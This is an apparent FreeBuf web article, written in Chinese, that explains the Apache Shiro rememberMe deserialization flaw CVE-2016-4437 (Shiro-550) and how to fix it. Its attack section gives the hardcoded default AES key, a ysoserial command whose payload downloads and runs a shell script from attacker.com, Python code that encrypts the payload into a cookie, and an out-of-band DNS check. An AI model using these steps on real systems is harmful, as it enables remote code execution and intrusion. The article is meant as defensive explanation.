---
title: CVE-2016-4437（Shiro-550）漏洞简述
url: https://www.freebuf.com/vuls/422102.html
source: FreeBuf网络安全行业门户
date: 2025-02-19
fetch_date: 2025-10-06T20:40:01.141208
---

# CVE-2016-4437（Shiro-550）漏洞简述

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

CVE-2016-4437（Shiro-550）漏洞简述

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

CVE-2016-4437（Shiro-550）漏洞简述

2025-02-18 15:55:50

所属地 上海

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 漏洞概述

CVE-2016-4437是Apache Shiro框架中的一个高危远程代码执行（RCE）漏洞。该漏洞源于Shiro的rememberMe身份验证功能使用硬编码的AES加密密钥，导致攻击者能够构造恶意序列化对象并加密后发送至服务器。当服务器解密并反序列化该对象时，可能触发任意代码执行。

## 漏洞原理

* RememberMe功能机制：

Shiro的rememberMe功能通过Cookie（名为rememberMe）保持用户的持久登录状态。

Cookie值为用户信息的序列化数据，使用AES加密（CBC模式，PKCS5Padding）。

* 默认密钥的暴露：

Shiro的默认AES密钥为kPH+bIxk5D2deZiIxcaaaA==（Base64编码），硬编码在框架中。

若开发者未在配置中修改此密钥，攻击者可直接利用该密钥加密恶意Payload。

* 反序列化漏洞触发：

攻击者构造包含恶意Java对象的序列化数据，使用默认密钥加密后作为rememberMe Cookie发送。

Shiro服务端解密Cookie并反序列化数据，若环境中存在可利用的Gadget链（如Apache Commons Collections），则会执行任意代码。

## 影响范围

受影响版本：Apache Shiro ≤1.2.5

依赖条件：

使用默认rememberMe加密密钥。

目标应用的Classpath中存在可用的反序列化Gadget链（如commons-collections 3.1/4.0）。

## 攻击流程

* 获取或推测密钥：

若目标未修改密钥，直接使用kPH+bIxk5D2deZiIxcaaaA==。

若密钥被修改，需通过其他方式（如信息泄露、爆破）获取。

* 生成恶意Payload：

使用ysoserial生成Gadget链（如CommonsCollections2）：

```
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/shell.sh | bash" > payload.bin
```

* 加密Payload：

使用Shiro的AES加密模式对Payload加密，生成rememberMe Cookie值

```
from Crypto.Cipher import AES
import base64

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
cipher = AES.new(key, AES.MODE_CBC, IV=b'\x00'*16)
encrypted = cipher.encrypt(payload_padded)
rememberMe = base64.b64encode(encrypted).decode()
```

* 发送恶意请求：

将rememberMe Cookie附加到HTTP请求中：

```
python shiro_exploit.py -u http://target.com/login --check
```

* DNS外带验证：

生成触发DNS查询的Payload（利用URLDNS链）：

```
java -jar ysoserial.jar URLDNS http://dnslog.cn > payload.bin
```

观察DNS日志是否收到查询记录。

* 修复方案升级Apache Shiro：

升级至≥1.2.6版本，官方移除了默认密钥强制要求。

* 自定义强密钥：

在shiro.ini或配置类中设置随机生成的密钥：

```
securityManager.rememberMeManager.cipherKey = base64:NEW_RANDOM_BASE64_KEY
```

* 禁用RememberMe功能（如无需使用）：

在配置中关闭rememberMe：

```
@Bean
public SecurityManager securityManager() {
    DefaultWebSecurityManager manager = new DefaultWebSecurityManager();
    manager.setRememberMeManager(null); // 禁用
    return manager;
}
```

* 限制反序列化类：

使用ClassFilterResolver限制允许反序列化的类：

```
DefaultRememberMeManager rememberMeManager = new DefaultRememberMeManager();
rememberMeManager.setCipherKey(customKey);
rememberMeManager.getCookie().setClassFilter(clazz -> allowedClasses.contains(clazz.getName()));
```

* 依赖库安全：

移除或升级存在Gadget链的库（如commons-collections升级至≥3.2.2或4.1）。

* 防御验证

密钥检查：

确认配置文件中无硬编码默认密钥，且密钥长度符合AES要求（如256位）。

渗透测试：

使用已知Payload尝试攻击，验证防御是否生效。

日志监控：

监控异常反序列化操作日志：

```
org.apache.shiro.io.SerializationException: Unable to deserialize argument byte array.
```

## 总结

CVE-2016-4437暴露了默认加密密钥和反序列化机制的风险组合。修复的核心在于使用自定义密钥、升级依赖库和限制反序列化操作。开发者应遵循最小权限原则，避免信任未经验证的输入，并定期进行安全审计。

# 漏洞 # 渗透测试 # web安全

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

漏洞概述

漏洞原理

影响范围

攻击流程

总结

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)